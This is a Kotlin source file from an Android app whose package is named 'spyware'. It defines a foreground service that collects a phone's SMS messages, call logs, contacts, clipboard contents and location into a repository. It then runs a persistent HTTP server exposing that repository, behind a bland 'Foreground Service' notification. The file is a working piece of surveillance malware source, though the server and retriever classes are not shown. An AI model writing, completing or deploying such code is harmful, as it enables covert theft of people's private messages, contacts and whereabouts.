package com.mhl.spyware




import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class MyForegroundService : Service() {
    private lateinit var dataRepository: DataRepository


    private lateinit var context : Context
    private var httpServer: Server? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())


    override fun onCreate() {

        super.onCreate()
        context = applicationContext
        dataRepository = DataRepository(
            smsRetriever = GetSms(this),
            callLogsRetriever = CallLogsRetriever(this),
            contactsRetriever = ContactsRetriever(this),
            clipboardRetriever = GetClipboard(this),
            locationRetriever = LocationUtils(this)
        )

        createNotificationChannel()

    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(1, notification)
        startHttpServer()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopHttpServer()
        serviceScope.cancel() // Cancel coroutines to clean up resources
    }

    override fun onBind(intent: Intent?): IBinder? {

        return null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "MyServiceChannel",
            "Foreground Service Channel",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "MyServiceChannel")
            .setContentTitle("Foreground Service")
            .setContentText("The service is running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }



    private fun startHttpServer() {
        serviceScope.launch {
            try {
                httpServer = Server(dataRepository,context)
                httpServer?.start()
                Log.d("MyForegroundService", "HTTP Server started")
            } catch (e: Exception) {
                Log.e("MyForegroundService", "Failed to start HTTP Server: ${e.message}")
            }
        }
    }

    private fun stopHttpServer() {
        try {
            httpServer?.stop()
            Log.d("MyForegroundService", "HTTP Server stopped")
        } catch (e: Exception) {
            Log.e("MyForegroundService", "Error stopping HTTP Server: ${e.message}")
        }
    }


}
